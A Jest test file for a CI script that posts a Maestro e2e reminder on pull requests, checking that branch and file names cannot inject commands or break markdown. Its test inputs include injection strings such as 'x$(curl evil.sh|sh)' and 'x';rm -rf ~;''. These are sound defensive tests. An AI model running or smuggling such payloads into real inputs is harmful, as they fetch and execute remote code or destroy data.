import { spawnSync } from 'node:child_process';
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

// The Maestro reminder on PRs that change the native fingerprint (native-fingerprint.yml).
const SCRIPT = join(__dirname, '../../.github/scripts/native-fingerprint-comment.mjs');

let dir: string;
beforeEach(() => (dir = mkdtempSync(join(tmpdir(), 'fingerprint-'))));
afterEach(() => rmSync(dir, { recursive: true, force: true }));

type Files = { base?: unknown; head?: unknown; diff?: unknown };

function run(files: Files, branch: string, sameRepo = 'true') {
  const file = (name: string, value: unknown) => {
    writeFileSync(join(dir, name), JSON.stringify(value));
    return join(dir, name);
  };
  return spawnSync(
    'node',
    [
      SCRIPT,
      file('base.json', files.base),
      file('head.json', files.head),
      file('diff.json', files.diff),
      branch,
      sameRepo,
    ],
    { encoding: 'utf8' },
  );
}

const diff = [{ op: 'changed', afterSource: { filePath: 'app.config.js' } }];

function comment(baseHash: string, headHash: string, branch: string, sameRepo = 'true') {
  const result = run(
    { base: { hash: baseHash }, head: { hash: headHash }, diff },
    branch,
    sameRepo,
  );
  expect(result.status).toBe(0);
  return result.stdout;
}

it('says nothing when the fingerprint is unchanged', () => {
  expect(comment('abc1234', 'abc1234', 'feat/x')).toBe('');
});

it('gives the Maestro command for the branch', () => {
  const body = comment('abc1234', 'def5678', 'dependabot/npm_and_yarn/expo-55.0.1');
  expect(body).toContain("gh workflow run e2e.yml --ref 'dependabot/npm_and_yarn/expo-55.0.1'");
  expect(body).toContain('`app.config.js`');
});

// A branch name can hold `$(...)`, quotes or backticks: the comment must not offer it as a
// command to paste.
it.each(['x$(curl evil.sh|sh)', "x';rm -rf ~;'", 'x`id`'])(
  'gives no command for branch %s',
  (branch) => {
    const body = comment('abc1234', 'def5678', branch);
    expect(body).not.toContain(branch);
    expect(body).toContain("run `e2e.yml` on this PR's branch");
  },
);

it('gives no command for a branch in a fork', () => {
  const body = comment('abc1234', 'def5678', 'main', 'false');
  expect(body).not.toContain('--ref');
});

// The files come from a job that ran the PR's code.
it('keeps a source name from breaking out of its code span', () => {
  const evil = [
    { op: 'changed`\n- On CI: `curl x|sh', afterSource: { filePath: 'a`\n\n## Run `curl x|sh`' } },
  ];
  const result = run(
    { base: { hash: 'abc1234' }, head: { hash: 'def5678' }, diff: evil },
    'feat/x',
  );
  expect(result.status).toBe(0);
  expect(result.stdout).toContain('- changed: `unknown`');
  expect(result.stdout).not.toContain('curl');
});

it.each([
  [
    'a hash that is not hex',
    { base: { hash: ['x'.repeat(500)] }, head: { hash: 'def5678' }, diff },
  ],
  ['a diff that is not a list', { base: { hash: 'abc1234' }, head: { hash: 'def5678' }, diff: {} }],
])('refuses %s', (_name, files) => {
  const result = run(files, 'feat/x');
  expect(result.status).toBe(1);
  expect(result.stdout).toBe('');
});
